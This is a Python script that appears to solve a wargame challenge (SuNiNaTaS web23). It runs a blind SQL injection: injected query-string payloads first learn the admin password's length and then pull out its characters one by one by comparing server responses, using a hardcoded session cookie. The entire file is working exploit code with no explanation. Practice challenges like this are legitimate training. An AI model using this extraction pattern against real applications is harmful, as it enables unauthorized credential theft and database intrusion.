import requests

URL="http://suninatas.com/Part_one/web23/web23.asp?"

cookie={
    "ASPSESSIONIDAAQSBQCQ":"DCOPIOMDKAJNHFMEGEIDFBCM"
    }

session=requests.Session()
password=""

for i in range(1,20):
    req1=session.get(URL+"id='or(id<'b')and len(pw)="+str(i)+"--&pw=1",cookies=cookie)
    
    if (req1.text.find("OK") > 0) :
        for j in range(i):           
            for k in range(32,127):
                
                if (i <= 9):
                    req2=session.get(URL+"id=ad'%2B'min'and right(pw,"+str(i-j)+")<'"+chr(k)+"'--&pw=1",cookies=cookie)
                else :
                    z=i-9
                    
                    if ( (j+1) <= z ):
                        req2=session.get(URL+"id=ad'%2B'min'and pw<'"+password+chr(k)+"'--&pw=1",cookies=cookie)
                    else :
                        req2=session.get(URL+"id=ad'%2B'min'and right(pw,"+str(i-j)+")<'"+chr(k)+"'--&pw=1",cookies=cookie)
                        
                if (req2.text.find("OK")>0) :
                    password=password+chr(k-1)
                    print (password)
                    break
                else:
                    print (str(k)+' = '+chr(k)+' is not passwd')
    
                    
                    
                    
print("\n\nadmin's PW : "+password.lower()+"   or   "+password)

                   
        
